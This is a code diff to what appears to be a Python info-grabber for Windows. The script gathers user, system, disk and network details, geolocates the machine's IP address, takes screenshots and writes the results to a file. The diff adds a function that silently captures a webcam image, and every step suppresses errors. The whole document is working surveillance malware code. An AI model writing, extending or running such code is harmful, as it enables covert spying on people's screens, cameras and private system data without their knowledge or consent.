@@ -7,7 +7,8 @@ import win32api
 import wmi
 import socket
 import pyperclip
-from PIL import ImageGrab
+from PIL import ImageGrab, Image
+import cv2
 
 
 def user():
@@ -50,7 +51,7 @@ def disk():
 def network():
     def location(ip):
         try:
-            response = requests.get(f"http://ip-api.com/json/{ip}", headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"})
+            response = requests.get(f"http://ip-api.com/json/{ip}", headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}) #Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
             data = response.json()
             return data["country"], data["regionName"], data["city"], data["zip"], data["as"]
         except:
@@ -73,12 +74,28 @@ def screenshot():
     except:
         pass
 
+
+def webcam():
+    try:
+        cap = cv2.VideoCapture(0)
+        x, frame = cap.read()
+
+        img = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+        image = Image.fromarray(img)
+
+        image.save("webcam.png")
+        cap.release()
+    except:
+        return
+
+
 #print(f"User data: {user()}\nSystem data: {system()}\nDisk data: {disk()}\nNetwork data: {network()}")
 def start():
     try:
         with open("system.txt", "w",encoding="utf-8") as f:
             f.write(f"User data: {user()}\nSystem data: {system()}\nDisk data: {disk()}\nNetwork data: {network()}")
         screenshot()
+        webcam()
     except:
         pass
         
